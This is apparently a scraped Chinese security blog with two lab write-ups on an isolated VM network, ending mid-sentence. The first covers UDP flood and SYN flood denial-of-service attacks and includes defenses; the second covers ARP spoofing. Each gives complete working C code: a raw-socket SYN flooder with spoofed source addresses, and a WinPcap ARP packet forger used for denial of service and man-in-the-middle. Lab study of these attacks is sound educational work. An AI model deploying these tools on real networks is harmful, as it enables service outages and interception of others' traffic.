TCP正常连接过程 A发送SYN包后死机或掉线 TCP协议头\nTCP伪首部\n伪首部共有 12 字节，包含 IP 协议头部的一些字段，有如下信息：32位源IP地址、32位目的IP地址、8位保留字节(置0)、8位传输层协议号(TCP是6，UDP是17)、16位TCP报文长度(TCP首部+数据)。 TCP 协议校验和计算三部分：TCP伪首部 + TCP头部 + TCP数据。 IP 头部\nTCP 协议通过一种名为 三次握手 的过程来建立客户端与服务端的连接，三次握手 过程的原理如图\n建立连接三次握手过程如下：\n客户端需要发送一个 SYN包 给服务端（包含了客户端初始化序列号），并且将连接的状态设置为 SYN_SENT，这个过程由 connect() 系统调用完成。\n服务端接收到客户端发送过来的 SYN包 后，回复一个 SYN+ACK包 给客户端（包含了服务端初始化序列号），并且设置连接的状态为 SYN_RCVD。\n客户端接收到服务端发送过来的 SYN+ACK包 后，设置连接状态为 ESTABLISHED（表示连接已经建立），并且回复一个 ACK包 给服务端。\n服务端接收到客户端发送过来的 ACK包 后，将连接状态设置为 ESTABLISHED（表示连接已经建立）。\n当 三次握手 过程完成后，一个 TCP 连接就此建立完成。\nSYN-flood攻击大概有以下三种攻击方式：\nDirect Attack 攻击方使用固定的源地址发起攻击，这种方法对攻击方的消耗最小。 Spoofing(欺骗) Attack 攻击方使用变化的源地址发起攻击，这种方法需要攻击方不停地修改源地址，实际上消耗也不大。 Distributed Direct Attack 这种攻击主要是使用僵尸网络进行固定源地址的攻击 0x03 实验环境 部署于同一局域网下 攻击机 网络安全实验 Windows xp IP:192.168.195.131 MAC :00-0C-29-06-65-C9 靶机 汇编 Windows xp IP:192.168.195.135 MAC : 00-0c-29-19-ba-6e 程序运行机器 Ubuntu 16 网关 IP : 192.168.195.2 MAC : 00-50-56-e7-d4-22 工具： udp-Flood 阿拉丁 visual studio code wireshark 0x04 工具分析 udp_Flood 首先看一下靶机IP:192.168.195.135开放的端口\n发现TCP中21、22、80端口均开启，UDP开启445,500端口 首先在攻击机打开udp_flood工具，对80端口进行攻击。\n每秒发11个包 然后在靶机中打开Wireshark进行抓包\n容易发现，攻击机向靶机每发一个UDP包，靶机就会回应一个ICMP包\n不难发现，udp包的数据流都没有问题，所有udp包的大小相同，协议相同，短时间发送大量的包\n但是服务器回显ICMP显示Port Unreachable\n这是因为服务器响应发送到其中一个端口的UDP数据包所采取的步骤。在正常情况下，当服务器在特定端口接收到UDP数据包时，会经过两个步骤：\n服务器首先检查是否正在运行正在侦听指定端口的请求的程序。 如果没有程序在该端口接收数据包，则服务器使用ICMP（ping）数据包进行响应，以通知发送方目的地不可达。 80端口并没有UDP进行监听，因此服务器会返回一个ICMP包，告诉发送方不可到达。\n这里利用UDP开始监听的445端口进行实验\nudp发送的包同样没有问题，大小相同，均为83。 这里查看一下udp_flood攻击之前的时间\n然后打开udp_flood，攻击80端口 可以看到阿拉丁udp_flood攻击之后，访问百度会丢包，然后平均时间也增加了 因此，udp_flood一定程度上会阻碍服务器的访问速度。 因此，在udp_flood攻击中，攻击者可发送大量伪造源IP地址的小udp包。由于UDP协议是无连接性的，所以只要开了一个UDP的端口提供相关服务的话，那么就可针对相关的服务进行攻击。这种攻击方式消耗的是攻击者与靶机方两方资源的比拼。\n阿拉丁 首先查看一下靶机开放的端口 在攻击机中打开阿拉丁udp洪水攻击器 首先工具靶机的80端口 便于测试，这里进行一般udp攻击 在靶机中跟据Wireshark进行抓包 分析一下udp数据包 可以很明显的看到udp数据包的源IP、MAC和目的IP、MAC都是正确的，唯一异常的是udp传送的数据包Data的数据过长，为3000byte, 同时udp因为超过1500会分片传输，大大提高了攻击的效率。 将端口改为445 分析一下udp的结构 发现也完全符合预期，和udp_flood相比，只是包的大小变大了，DDOS的威力也更强大了。 这里查看一下工具前 ping www.baidu.com的时延 攻击靶机的80端口 很明显看到攻击后的udp攻击使得服务器的最高时延增加。 因此，udp_flood一定程度上会阻碍服务器的访问速度。 由此可以知道，udp_flood工具和阿拉丁的原理相同，都是利用UDP洪水攻击，大批量的消耗资源来进行DDOS攻击。 攻击效果的话，如果带宽、流量足够大的话，服务器的会不断的接受包、然后瘫痪、无法正常上网。 0x05 SYN-Flood 编程实现 这里用套接字socket的方法来实现syn-flood攻击\n只需要构造好一个TCP包，指定好包中IP.flags=0x02(为SYN包)。\n我们这里在ubuntu 16 的环境中编译我们写好的程序\n首先查看一下靶机(IP : 192.168.195.135)的开放端口\n发现开启了21、22、80端口 在程序中，对192.168.195.135的80端口进行攻击\n因为程序是无限循环发送，需要手动终止 与此同时，利用Wireshark在靶机进行抓包\n可以看到程序随机产生大量的虚假地址和虚假的端口对靶机的80端口进行访问，因为地址和端口都为虚假的，所以大量的tcp连接靶机无法对其ack回复。 产生大量的syn半连接，导致服务器载荷过大，从而崩溃。\n查看此时的syn状态。 可以很清晰的看到，程序产生了大量的syn半连接，来自不同的虚假ip地址和端口 查看攻击前 ping www.baidu.com 的效果\n攻击其21端口 发现ping www.baidu.com 已经不能Ping通 同时很明显的感受到Windows xp因为受到SYN攻击，因此运行不流畅，卡顿相当严重。\n实际上，SYN-flood攻击就是 构造大量的SYN包、里面填充虚假的IP、MAC地址，来造成服务器产生大量的半连接，从而造成服务器运行瘫痪。\n完整代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;netdb.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; // ip 报头 struct iphdr { unsigned char ver_and_hdrlen;// 版本号与IP头部长度 unsigned char tos; // 服务类型 unsigned short total_len; // 总长度 unsigned short id; // IP包ID unsigned short flags; // 标志位(包括分片偏移量) unsigned char ttl; // 生命周期 unsigned char protocol; // 上层协议 unsigned short checksum; // 校验和 unsigned int srcaddr; // 源IP地址 unsigned int dstaddr; // 目标IP地址 }; // tcp 报头 struct tcphdr { unsigned short sport; // 源端口 unsigned short dport; // 目标端口 unsigned int seq; // 序列号 unsigned int ack_seq; // 确认号 unsigned char len; // 首部长度 unsigned char flag; // 标志位 unsigned short win; // 窗口大小 unsigned short checksum; // 校验和 unsigned short urg; // 紧急指针 }; //TCP的伪报头，在计算TCP的校验和时需要包含 struct pseudohdr { unsigned int saddr; //源目的IP unsigned int daddr; // 目的IP char zeros; // 8位保留字符 一般置0 char protocol;// 协议 unsigned short length; // 长度 }; // 这个是计算校验和的函数 unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u0026gt; 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u0026gt;\u0026gt; 16) + (cksum \u0026amp; 0xffff); cksum += (cksum \u0026gt;\u0026gt; 16); return (unsigned short )(~cksum); } // 通过传入的源 IP 地址和目标 IP 地址初始化 IP 头部结构。 void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u0026gt;ver_and_hdrlen = (4\u0026lt;\u0026lt;4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u0026gt;tos = 0; ip-\u0026gt;total_len = htons(len); ip-\u0026gt;id = 1; ip-\u0026gt;flags = 0x40; ip-\u0026gt;ttl = 255; ip-\u0026gt;protocol = IPPROTO_TCP; ip-\u0026gt;checksum = 0; ip-\u0026gt;srcaddr = srcaddr; // 源IP地址 ip-\u0026gt;dstaddr = dstaddr; // 目标IP地址 } // 初始化 tcp 包 void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u0026gt;sport = htons(rand() % 16383 + 49152); // 随机生成一个端口 tcp-\u0026gt;dport = htons(dport); // 目标端口 tcp-\u0026gt;seq = htonl(rand() % 90000000 + 2345 ); // 随机生成一个初始化序列号 tcp-\u0026gt;ack_seq = 0; tcp-\u0026gt;len = (sizeof(struct tcphdr) / 4 \u0026lt;\u0026lt; 4 | 0); tcp-\u0026gt;flag = 0x02; // 0x02 代表 是syn 包，tcp三次连接请求的开始 tcp-\u0026gt;win = htons(1024); tcp-\u0026gt;checksum = 0; tcp-\u0026gt;urg = 0; } // 初始化 tcp 伪报头 void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u0026gt;zeros = 0; pseudo-\u0026gt;protocol = IPPROTO_TCP; pseudo-\u0026gt;length = htons(sizeof(struct tcphdr)); pseudo-\u0026gt;saddr = srcaddr; pseudo-\u0026gt;daddr = dstaddr; } // 通过 目标IP地址 和 目标端口 生成一个 SYN包，保存到参数 packet 中，并且返回包的大小。 int make_syn_packet(char *packet, int pkt_len, unsigned int daddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP 头部 struct tcphdr tcp; //TCP 头部 struct pseudohdr pseudo; //TCP 伪头部 unsigned int saddr = rand(); len = sizeof(ip) + sizeof(tcp); // 初始化头部信息 init_ip_header(\u0026amp;ip, saddr, daddr); init_tcp_header(\u0026amp;tcp, dport); init_pseudo_header(\u0026amp;pseudo, saddr, daddr); //计算IP校验和 ip.checksum = checksum((u_short *)\u0026amp;ip, sizeof(ip)); // 计算TCP校验和 bzero(buf, sizeof(buf)); memcpy(buf , \u0026amp;pseudo, sizeof(pseudo)); // 复制TCP伪头部 memcpy(buf + sizeof(pseudo), \u0026amp;tcp, sizeof(tcp)); // 复制TCP头部 tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026amp;ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026amp;tcp, sizeof(tcp)); return len; } // 创造原始套接字 int make_raw_socket() { int fd; int on = 1; // 创建一个原始套接字, 指定其关注TCP协议 fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // 设置需要手动构建IP头部 if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026amp;on, sizeof(on)) \u0026lt; 0) { close(fd); return -1; } /* 在调用 socket() 函数创建套接字时，指定第二个参数为 SOCK_RAW，表示创建的套接字为原始套接字。然后调用 setsockopt() 函\t数设置 IP 头部由我们自己构建 */ return fd; } // 传入原始套接字、目标IP地址和目标端口，然后通过调用 sendto() 函数向服务端发送一个 SYN包 int send_syn_packet(int sockfd, unsigned int addr, unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026amp;skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\u0026#34;%d已攻击!\\n\u0026#34;,addr); pkt_len = make_syn_packet(packet, 256, addr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026amp;skaddr, sizeof(struct sockaddr)); } // 主函数 int main(int argc, char *argv[]) { unsigned int addr; unsigned short port; int sockfd; if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;Usage: synflood \u0026lt;address\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;); exit(1); } // argv[1] 目的地址 // argc[2] 目的端口 addr = inet_addr(argv[1]); port = atoi(argv[2]); // 判断端口是否 存在 if (port \u0026lt; 0 || port \u0026gt; 65535) { fprintf(stderr, \u0026#34;Invalid destination port number: %s\\n\u0026#34;, argv[2]); exit(1); } // 开启socket sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \u0026#34;Failed to make raw socket\\n\u0026#34;); exit(1); } // for 无限循环，发送syn包 for (;;) { if (send_syn_packet(sockfd, addr, port) \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to send syn packet\\n\u0026#34;); } } close(sockfd); return 0; } 0x06 实验结论 udp_flood攻击就是构造大量的udp包(可以携带少量数据，也可以携带大量数据，携带数据量越大对服务器的载荷承受就越严重)，占用服务器大量的处理内存，从而引起服务器崩溃。\nSYN-Flood三种攻击方式\nDirect Attack 攻击方使用固定的源地址发起攻击，这种方法对攻击方的消耗最小。 Spoofing(欺骗) Attack 攻击方使用变化的源地址发起攻击，这种方法需要攻击方不停地修改源地址，实际上消耗也不大。 Distributed Direct Attack 这种攻击主要是使用僵尸网络进行固定源地址的攻击 防御手段\nUdp_Flood\n大多数操作系统部分限制了ICMP报文的响应速率，以中断需要ICMP响应的DDoS攻击。这种缓解的一个缺点是在攻击过程中，合法的数据包也可能被过滤。如果UDP Flood的容量足够高以使目标服务器的防火墙的状态表饱和，则在服务器级别发生的任何缓解都将不足以应对目标设备上游的瓶颈。 判断包大小，如果是大包攻击则使用防止UDP碎片方法：根据攻击包大小设定包碎片重组大小，通常不小于1500。在极端情况下，可以考虑丢弃所有UDP碎片。 SYN-Flood\n缩短超时（SYN Timeout）时间\n由于SYN Flood攻击的效果取决于服务器上保持的SYN半连接数，这个值=SYN攻击的频度 x SYN Timeout，所以通过缩短从接收到SYN报文到确定这个报文无效并丢弃改连接的时间，例如设置为20秒以下，可以成倍的降低服务器的负荷。但过低的SYN Timeout设置可能会影响客户的正常访问。\n注意：缩短SYN Timeout时间仅在对方攻击频度不高的情况下生效\n增加最大半连接数\nMore Actions在Linux中执行命令”sysctl -agrep net.ipv4.tcp_max_syn_backlog”可以查看最大半连接数，一般来说大小为128，这个默认值对于Web服务器来说是远远不够的，一次简单的SYN攻击就足以将其完全占用。 因此，防御DOS攻击最简单的办法就是增大这个默认值，在Linux中执行命令”sysctl -w et.ipv4.tcp_max_syn_backlog=3000”，这样就可以将队列SYN最大半连接数容量值改为3000了 过滤网关防护\n一种方式是防止墙确认连接的有效性后，防火墙才会向内部服务器发起SYN请求。防火墙代服务器发出的SYN ACK包使用的序列号为c, 而真正的服务器回应的序列号为c’, 这样，在每个数据报文经过防火墙的时候进行序列号的修改。\n另一种方式是防火墙确定了连接的安全后，会发出一个safe reset命令，client会进行重新连接，这时出现的syn报文会直接放行。这样不需要修改序列号了。但是，client需要发起两次握手过程，因此建立连接的时间将会延长。\nSYN cookies技术\n给每一个请求连接的IP地址分配一个Cookie，如果短时间内连续受到某个IP的重复SYN报文，就认定是受到了攻击，并记录地址信息，以后从这个IP地址来的包会被一概丢弃。这样做的结果也可能会影响到正常用户的访问。 ","permalink":"http://www.reus09.top/posts/tech/ddos/","summary":"拒绝服务攻击 0x01 实验目的 使用udp flood、阿拉丁等工具，分组展开攻击并利用wireshark分析。 编程实现SYN Flood攻击。 0x02 实验前提","title":"DDos"},{"content":"ARP欺骗实验 0x01 实验前提知识 ARP协议的安全问题 ARP协议是建立在信任局域网内所有结点的基础上的，它高效，但却不安全。\nARP高速缓存根据所接收到的ARP协议包随时进行动态更新，它是无状态的协议，不会检查自己是否发过请求包，只要收到目标MAC是自己的ARP响应数据包或ARP广播包，都会接受并缓存。\nARP协议没有认证机制，只要接收到的协议包是有效的，主机就无条件地根据协议包的内容刷新本机ARP缓存，并不检查该协议包的合法性。\n因此攻击者可以随时发送虚假ARP包更新被攻击主机上的ARP缓存，进行地址欺骗或拒绝服务攻击。\nARP Reply Spoofing 构造虚假的ARP响应包，篡改目标主机的MAC地址，例：\n广播攻击 当数据包的目标MAC地址为FF:FF:FF:FF:FF:FF，该数据包将会被广播。构造响应包，其中协议地址为网关IP，而MAC地址为广播地址，将这样的响应包发给局域网内主机。那么，局域网主机发给网关的数据包都将被广播。这既是一种嗅探方法，也可作为干扰网络服务的攻击方法。 拒绝服务攻击 构造虚假响应包，其中协议地址为关键服务的IP地址，例如网关，而MAC地址为不存在的虚假地址，将这样的响应包发给局域网内主机。那么，局域网主机发给关键服务（如网关）的数据包都将丢失，从而形成拒绝服务攻击。 中间人攻击 0x02 实验工具及环境 部署于同一局域网下，Vmware内部的两台Winxp 以及 主机 的三台机器 攻击机 win xp IP: 192.168.195.131 MAC : 00-0c-29-06-65-c9 靶机 win xp IP : 192.168.185.138 MAC : 00-0c-29-19-ba-6e win 10 IP : 192.168.195.1 MAC : 00-50-56-c0-00-08 网关 IP : 192.168.195.2 MAC : 00-50-56-e7-d4-22 工具 WinArpAttacker visual studio 19 wireshark 0x03 使用在线工具WinArpAttacker 禁止上网功能 靶机 IP ： 192.168.185.138\n未进行禁止上网前的 靶机状态，可以正常上网\n在WinArpAttacker工具中选取靶机IP：192.168.185.138 进行禁止上网攻击\n发现此时的网站刷新后无法打开，并且 该靶机 与 网关 192.168.195.2的MAC 地址被篡改为 01-01-01-01-01-01\n利用Wireshark抓取禁止上网的流量包\n抓获到两条arp数据包 分析第一个arp数据包 源MAC 被设置为 错误的MAC地址 :01-01-01-01-01-01 (该MAC地址不会被用到) 源IP 为靶机 的IP : 192.168.195.138 目的 MAC 和 目的 IP 均指向正确的 网关 IP 和地址 由此 网关中存取的ARP 表中 靶机IP 192.168.195.138 对应的MAC 地址被更新为 01-01-01-01-01-01 分析第二个数据包 源MAC 被设置为 错误的MAC地址 :01-01-01-01-01-01 (该MAC地址不会被用到) 源IP 为 网关 的IP : 192.168.195.2 目的 MAC 和 目的 IP 均指向正确的 靶机（192.168.195.138） IP 和地址 由此 靶机中存取的ARP 表中 网关IP 192.168.195.2 对应的MAC 地址被更新为 01-01-01-01-01-01 由此实现了 网关和靶机(192.168.195.138) 之间的MAC地址均为错误的目标机MAC地址，当靶机访问外网的时候，MAC无法访问正确的网卡，同时网关也无法访问 靶机，从而无法与外网数据相同，从而无法上网。\nIP冲突功能 靶机IP : 192.168.195.138\n未进行IP冲突前，靶机可以正常上网\n在WinArpAttacker工具中选取靶机IP：192.168.185.138 进行定时IP冲突和 不断IP 冲突。\n在靶机观察到，系统产生提醒：\nIP地址与网络上的其他系统有冲突。 用Wireshark分别抓包 定时IP冲突和不断IP冲突\n定时IP冲突 不断IP冲突 可以发现不断IP冲突即为将定时IP冲突发送的ARP包 连续发送 1000次 形成洪泛攻击而已。\n因此这里只需要分析IP冲突的 一个ARP 包即可。\n源MAC 被设置为 错误的MAC地址 :01-01-01-01-01-01 (该MAC地址不会被用到) 源IP 为靶机 的IP : 192.168.195.138 目的 MAC 和 目的 IP 均指向正确的 靶机（192.168.195.138） IP 和地址 由此相当于，靶机向自身发送了大量MAC地址为错误地址01-01-01-01-01-01的ARP包，从而引起IP冲突，使靶机无法上网\n中间人攻击 实现用攻击机(IP:192.168.195.131) 检测 靶机(IP:192.168.195.1) ping 靶机(IP : 192.168.195.138)\n没有用中间人攻击前\n主机ping 靶机(192.168.195.138 ) 可以看到速度很\n主机win 10 的 ARP 表对应地址\n靶机 win xp 的 ARP表对应MAC\n可以看到主机win10 和 靶机xp 之间的mac 对应关系正确。\n在WinArpAttacker工具中选取靶机IP：192.168.185.138 和主机win10 IP (192.168.195.1) 进行监管主机通讯\n此时再度由主机win10 ping 靶机 win xp\n可以很明显的看到 ping 发送的时间间隔大幅度变长。\n与此同时，主机WIN10的ARP表 目标靶机ip(192.168.195.138)的MAC 地址被篡改为 攻击机IP(192.168.195.131)的MAC地址。\n相应的，目标靶机(IP192.168.195.138) 的ARP表 中对应 主机(IP192.168.195.1)的MAC地址也被篡改为攻击机IP(192.168.195.131)的MAC地址。\n以上就是 中间人攻击之后的 效果。\n下面利用wireshark进行抓包，分析ARP数据包的流程。\n抓获到两个arp数据包\n第一个arp数据包\n源MAC 被设置为 攻击机的MAC 地址 :00-0c-29-06-65-c9 源IP 为靶机 的IP : 192.168.195.138 目的 MAC 和 目的 IP 均指向正确的 主机win10 的 IP 和地址 由此主机win10 中 的arp表，指向目标靶机(IP192.168.195.138)的mac地址被篡改为 攻击机(IP : 192.168.195.138)的MAC地址，因此主机win10发送给靶机的数据 均因为mac地址被发送到 攻击机上面。 第二个arp数据包\n源MAC 被设置为 攻击机的MAC 地址 :00-0c-29-06-65-c9 源IP 为靶机 的IP : 192.168.195.1 目的 MAC 和 目的 IP 均指向正确的 靶机 win xp 的 IP 和地址 由此靶机 win xp 中 的arp表，指向主机(IP192.168.195.1)的mac地址被篡改为 攻击机(IP : 192.168.195.138)的MAC地址，因此同样靶机win xp 发给 主机win 10 的数据流也会被先发给 攻击机。 总而言之，中间人攻击即为\n攻击者向目标发送虚假应答包，告诉主机A“主机B的MAC地址是MacC（攻击者MAC）”，告诉主机B“主机A的MAC地址是MacC（攻击者MAC）”\n成功后，主机A发送给主机B的数据包被转发给主机C，主机B发送给主机A的数据包也被转发给主机C，\n于是A、B之间的数据均被C嗅探。攻击者C会转发重定向到自己的数据包到正确位置，因此A和B没有察觉到嗅探的存在。\n0x04 基于Winpcap 对指定目标IP进行ARP欺骗攻击 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 #define WIN32 #define HAVE_REMOTE #include\u0026lt;stdio.h\u0026gt; typedef unsigned char u_char; typedef unsigned short u_short; typedef unsigned int u_int; #include \u0026lt;pcap.h\u0026gt; #define ETH_ARP 0x0806 //以太网帧类型表示后面数据的类型，对于ARP请求或应答来说，该字段的值为x0806 #define ARP_HARDWARE 1 //硬件类型字段值为表示以太网地址 #define ETH_IP 0x0800 //协议类型字段表示要映射的协议地址类型值为x0800表示IP地址 #define ARP_REQUEST 1 //ARP请求 #define ARP_RESPONSE 2 //ARP应答 //14字节以太网首部 struct EthernetHeader { u_char DestMAC[6]; //目的MAC地址 6字节 u_char SourMAC[6]; //源MAC地址 6字节 u_short EthType; //上一层协议类型，如0x0800代表上一层是IP协议，0x0806为arp 2字节 }; //28字节ARP帧结构 struct ArpHeader { unsigned short hdType; //硬件类型 unsigned short proType; //协议类型 unsigned char hdSize; //硬件地址长度 unsigned char proSize; //协议地址长度 unsigned short op; //操作类型，ARP请求（1），ARP应答（2），RARP请求（3），RARP应答（4）。 u_char smac[6]; //源MAC地址 u_char sip[4]; //源IP地址 u_char dmac[6]; //目的MAC地址 u_char dip[4]; //目的IP地址 }; //定义整个arp报文包，总长度42字节 struct ArpPacket { struct EthernetHeader ed; struct ArpHeader ah; }; int main() { pcap_if_t* alldevs; //所有网络适配器 pcap_if_t* d; //选中的网络适配器 int inum; //选择网络适配器 int i = 0; //for循环变量 pcap_t* adhandle; //打开网络适配器，捕捉实例,是pcap_open返回的对象 char errbuf[PCAP_ERRBUF_SIZE]; //错误缓冲区,大小为256 /* 获取本机设备列表 */ // 获取本机相关的所有网关 if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, \u0026amp;alldevs, errbuf) == -1) { fprintf(stderr, \u0026#34;Error in pcap_findalldevs: %s\\n\u0026#34;, errbuf); exit(1); } /* 打印网关列表 */ for (d = alldevs; d; d = d-\u0026gt;next) { printf(\u0026#34;%d. %s\u0026#34;, ++i, d-\u0026gt;name); if (d-\u0026gt;description) printf(\u0026#34; (%s)\\n\u0026#34;, d-\u0026gt;description); else printf(\u0026#34; (No description available)\\n\u0026#34;); } // 如果 i = 0 ，说明该计算机没有网关 if (i == 0) { printf(\u0026#34;\\nNo interfaces found! Make sure WinPcap is installed.\\n\u0026#34;); return -1; } // 选择合适的网关 printf(\u0026#34;Enter the interface number (1-%d):\u0026#34;, i); scanf(\u0026#34;%d\u0026#34;, \u0026amp;inum); if (inum \u0026lt; 1 || inum \u0026gt; i) { printf(\u0026#34;\\nInterface number out of range.\\n\u0026#34;); /* 释放设备列表 */ pcap_freealldevs(alldevs); return -1; } /* 跳转到选中的适配器 */ for (d = alldevs, i = 0; i \u0026lt; inum - 1; d = d-\u0026gt;next, i++); /* 打开设备 */ if ((adhandle = pcap_open(d-\u0026gt;name, // 设备名 65536, // 65535保证能捕获到不同数据链路层上的每个数据包的全部内容 PCAP_OPENFLAG_PROMISCUOUS, // 混杂模式 1000, // 读取超时时间 NULL, // 远程机器验证 errbuf // 错误缓冲池 )) == NULL) { fprintf(stderr, \u0026#34;\\nUnable to open the adapter. %s is not supported by WinPcap\\n\u0026#34;, d-\u0026gt;name); /* 释放设备列表 */ pcap_freealldevs(alldevs); return -1; } /*以上代码在WinPcap开发文档中都可以找到，填充ARP包的代码则要自己编写*/ //开始填充ARP包，填充数据写死在代码中，测试用时数据可随意填写 unsigned char sendbuf[42]; //arp包结构大小，42个字节 unsigned char mac[6] = { 0x01,0x01,0x01,0x01,0x01,0x01 }; //unsigned char mac[6] = { 0xff,0xff,0xff,0xff,0xff,0xff }; unsigned char ip[4] = { 192,168,195,138 }; unsigned char dmac[6] = {0x00,0x50,0x56,0xe7,0xd4,0x22}; unsigned char d_ip[4] = {192,168,195,2}; struct EthernetHeader eh; struct ArpHeader ah; //赋值MAC地址 //memset(eh.DestMAC, 0xff, 6); //以太网首部目的MAC地址，全为广播地址 memcpy(eh.DestMAC, dmac, 6); //以太网首部目的MAC地址 memcpy(eh.SourMAC, mac, 6); //以太网首部源MAC地址 memcpy(ah.smac, mac, 6); //ARP字段源MAC地址 //memset(ah.dmac, 0xff, 6); //ARP字段目的MAC地址 memcpy(ah.dmac, dmac, 6); //ARP字段目的MAC地址 memcpy(ah.sip, ip, 4); //ARP字段源IP地址 memset(ah.dip, 0x05, 4); //ARP字段目的IP地址 memcpy(ah.dip, d_ip, 4); //ARP字段目的IP地址 eh.EthType = htons(ETH_ARP); //htons：将主机的无符号短整形数转换成网络字节顺序 ah.hdType = htons(ARP_HARDWARE); ah.proType = htons(ETH_IP); ah.hdSize = 6; ah.proSize = 4; ah.op = htons(ARP_REQUEST); //构造一个ARP请求 memset(sendbuf, 0, sizeof(sendbuf)); //ARP清零 memcpy(sendbuf, \u0026amp;eh, sizeof(eh)); memcpy(sendbuf + sizeof(eh), \u0026amp;ah, sizeof(ah)); //如果发送成功 if (pcap_sendpacket(adhandle, sendbuf, 42) == 0) { printf(\u0026#34;\\nPacketSend succeed\\n\u0026#34;); } else { printf(\u0026#34;PacketSendPacket in getmine Error: %d\\n\u0026#34;, GetLastError()); } /* 释放设备列表 */ pcap_freealldevs(alldevs); return 0; } 广播攻击 构造响应包，其中协议地址为网关IP，而MAC地址为广播地址，将这样的响应包发给局域网内主机。那么，局域网主机发给网关的数据包都将被广播。这既是一种嗅探方法，也可作为干扰网络服务的攻击方法。\n这里将靶机(192.168.195.138)对网关的MAC 地址篡改为 广播地址，利用攻击机(IP : 192.168.195.131)监控流量。\n在发包的源代码中：修改 IP和 MAC地址，构造ARP包\n1 2 3 4 5 6 7 源ip mac (这里是网关的IP地址 和 广播mac地址) unsigned char mac[6] = { 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF }; unsigned char ip[4] = { 192,168,195,2 }; 目的 ip mac (这里是 靶机的IP和MAC) unsigned char dmac[6] = {0x00,0x0C,0x29,0x19,0xba,0x6e}; unsigned char d_ip[4] = {192,168,195,138}; 这里的第一个arp -a 显示的 网关mac地址 为正确的 mac地址。\n第二个 arp -a 为 发送虚假构造的arp包 之后，网关地址被修改为 广播地址。\n然后用靶机(IP 192.168.195.138) ping win10主机 ，同时在攻击机(IP 192.168.195.131) 中用wireshark进行监控信道，进行抓包\n可以发现攻击机可以监控到 靶机(IP 192.168.195.138) ping www.baidu.com 的数据包\n对此ICMP 包，进行分析，可以看到发包的mac地址确实为 广播地址 FF-FF-FF-FF-FF-FF 拒绝服务攻击 构造虚假响应包，其中协议地址为关键服务的IP地址，例如网关，而MAC地址为不存在的虚假地址，将这样的响应包发给局域网内主机。那么，局域网主机发给关键服务（如网关）的数据包都将丢失，从而形成拒绝服务攻击。\n构造ARP数据包\n1 2 3 4 5 6 将arp包 发送源mac修改为虚假 的 mac地址 unsigned char mac[6] = { 0x01,0x01,0x01,0x01,0x01,0x01 }; unsigned char ip[4] = { 192,168,195,2 }; unsigned char dmac[6] = {0x00,0x0C,0x29,0x19,0xba,0x6e}; unsigned char d_ip[4] = {192,168,195,138}; 在 发送arp数据包前\n可以看到 arp 表 对应的mac 地址 正确，并且网页可以正常打开。 发送 arp 包\n查看靶机的 arp 表 和 上网状态。 可以看到 网关的 mac 地址 被篡改为 01-01-01-01-01-01 ，同时也无法访问百度了。 中间人攻击 这里设计思路与利用WinArpAttacker 进行中间人攻击一样。\n将靶机winxp(IP 192.168.195.138) 和 主机 win10 (IP 